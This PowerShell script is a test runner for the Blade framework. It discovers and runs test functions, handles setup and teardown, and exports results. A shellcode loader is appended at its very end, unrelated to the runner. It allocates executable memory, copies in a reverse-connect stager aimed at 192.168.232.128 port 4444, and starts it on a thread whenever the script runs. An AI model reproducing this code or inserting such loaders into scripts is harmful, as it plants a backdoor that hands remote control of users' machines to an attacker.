
[CmdletBinding()]
param(
    [Parameter(Mandatory=$true,Position=0)]
    [string[]]
    
    $Path,

    [string]
    
    $Name,

    [string[]]
    
    $Test,

    [string]
    
    $XmlLogPath,
    
    [Switch]
    
    $PassThru,
    
    [Switch]
    
    $Recurse
)


Set-StrictMode -Version 'Latest'

& (Join-Path -Path $PSScriptRoot -ChildPath 'Import-Blade.ps1' -Resolve)

function Get-FunctionsInFile($testScript)
{
    Write-Debug -Message "Loading test script '$testScript'."
    $testScriptContent = Get-Content "$testScript"
    if( -not $testScriptContent )
    {
        return @()
    }

    $errors = [Management.Automation.PSParseError[]] @()
    $tokens = [System.Management.Automation.PsParser]::Tokenize( $testScriptContent, [ref] $errors )
    if( $errors -ne $null -and $errors.Count -gt 0 )
    {
        Write-Error "Found $($errors.count) error(s) parsing '$testScript'."
        return
    }
    
    Write-Debug -Message "Found $($tokens.Count) tokens in '$testScript'."
    
    $functions = New-Object System.Collections.ArrayList
    $atFunction = $false
    for( $idx = 0; $idx -lt $tokens.Count; ++$idx )
    {
        $token = $tokens[$idx]
        if( $token.Type -eq 'Keyword'-and $token.Content -eq 'Function' )
        {
            $atFunction = $true
        }
        
        if( $atFunction -and $token.Type -eq 'CommandArgument' -and $token.Content -ne '' )
        {
            Write-Debug -Message "Found function '$($token.Content).'"
            [void] $functions.Add( $token.Content )
            $atFunction = $false
        }
    }
    
    return $functions.ToArray()
}

function Invoke-Test
{
    
    [CmdletBinding()]
    param(
        $fixture, 
        $function
    )

    Set-StrictMode -Version 'Latest'

    [Blade.TestResult]$testInfo = New-Object 'Blade.TestResult' $fixture,$function

    $Error.Clear()

    $testPassed = $false
    try
    {
        if( Test-path function:Start-Test )
        {
            . Start-Test | ForEach-Object { $testInfo.Output.Add( $_ ) }
        }
        elseif( Test-Path function:SetUp )
        {
            Write-Warning ('The SetUp function is obsolete and will be removed in a future version of Blade. Please use Start-Test instead.')
            . SetUp | ForEach-Object { $testInfo.Output.Add( $_ ) }
        }
        
        if( Test-Path function:$function )
        {
            . $function | ForEach-Object { $testInfo.Output.Add( $_ ) }
        }
        $testPassed = $true
    }
    catch [Blade.AssertionException]
    {
        $ex = $_.Exception
        $testInfo.Completed( $ex )
    }
    catch
    {
        $testInfo.Completed( $_ )
    }
    finally
    {
        $tearDownResult = New-Object 'Blade.TestResult' $fixture,$function
        $tearDownFailed = $false
        try
        {
            if( Test-Path function:Stop-Test )
            {
                . Stop-Test | ForEach-Object { $tearDownResult.Output.Add( $_ ) }
            }
            elseif( Test-Path -Path function:TearDown )
            {
                Write-Warning ('The TearDown function is obsolete and will be removed in a future version of Blade. Please use Start-Test instead.')
                . TearDown | ForEach-Object { $tearDownResult.Output.Add( $_ ) }
            }
            $tearDownResult.Completed()
        }
        catch
        {
            $tearDownResult.Completed( $_ )
            $tearDownFailed = $true
        }
        finally
        {
            if( $testPassed )
            {
                $testInfo.Completed()
            }

            $flag = '! '
            $result = 'FAILED'
            if( $testInfo.Passed )
            {
                $flag = '  '
                $result = 'Passed'
            }
            Write-Verbose -Message ('  {0}{1} in {2:mm\:ss\.fff}  [{3}]' -f $flag,$result,$testInfo.Duration,$function)
            $testInfo
            if( $tearDownFailed )
            {
                $tearDownResult
            }
        }

        $Error.Clear()
    }

}

$getChildItemParams = @{ }
if( $Recurse )
{
    $getChildItemParams.Recurse = $true
}

$testScripts = @( Get-ChildItem $Path Test-*.ps1 @getChildItemParams )
if( $testScripts -eq $null )
{
    $testScripts = @()
}

$Error.Clear()
$testsIgnored = 0
$TestScript = $null
$TestDir = $null

$results = $null

$testScripts | 
    ForEach-Object {
        $testCase = $_
        $TestScript = (Resolve-Path $testCase.FullName).Path
        $TestDir = Split-Path -Parent $testCase.FullName 
        
        $testModuleName =  [System.IO.Path]::GetFileNameWithoutExtension($testCase)

        $functions = Get-FunctionsInFile $testCase.FullName |
                        Where-Object { $_ -match '^(Test|Ignore)-(.*)$' } |
                        Where-Object { 
                            if( $PSBoundParameters.ContainsKey('Test') )
                            {
                                return $Test | Where-Object { $Matches[2] -like $_ } 
                            }

                            if( $Matches[1] -eq 'Ignore' )
                            {
                                Write-Warning ("Skipping ignored test '{0}'." -f $_)
                                $testsIgnored++
                                return $false
                            }

                            return $true
                        }
        if( -not $functions )
        {
            return
        }

        @('Start-TestFixture','Start-Test','Setup','TearDown','Stop-Test','Stop-TestFixture') |
            ForEach-Object { Join-Path -Path 'function:' -ChildPath $_ } |
            Where-Object { Test-Path -Path $_ } |
            Remove-Item
        
        Write-Verbose -Message ('[{0}]' -f $testCase.Name)

        . $testCase.FullName

        try
        {
            if( Test-Path -Path 'function:Start-TestFixture' )
            {
                . Start-TestFixture | Out-String | Write-Debug
            }

            foreach( $function in $functions )
            {

                if( -not (Test-Path -Path function:$function) )
                {
                    continue
                }
                
                Invoke-Test $testModuleName $function 
            }

            if( Test-Path -Path function:Stop-TestFixture )
            {
                try
                {
                    . Stop-TestFixture | Out-String | Write-Debug
                }
                catch
                {
                    Write-Error ("An error occured tearing down test fixture '{0}': {1}" -f $testCase.Name,$_)
                    $result = New-Object 'Blade.TestResult' $testModuleName,'Stop-TestFixture'
                    $result.Finished( $_ )
                }                
            }
        }
        finally
        {
            foreach( $function in $functions )
            {
                if( $function -and (Test-Path function:$function) )
                {
                    Remove-Item function:\$function
                }
            }
        }        
    } | 
    Tee-Object -Variable 'results' |
    Where-Object { $PassThru -or -not $_.Passed } 

$Global:LastBladeResult = New-Object 'Blade.RunResult' $Name,([Blade.TestResult[]]$results), $testsIgnored
if( $LastBladeResult.Errors -or $LastBladeResult.Failures )
{
    Write-Error $LastBladeResult.ToString()
}

if( $XmlLogPath )
{
    $LastBladeResult | Export-RunResultXml -FilePath $XmlLogPath
}

$LastBladeResult | Format-Table | Out-Host

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xe8,0x80,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

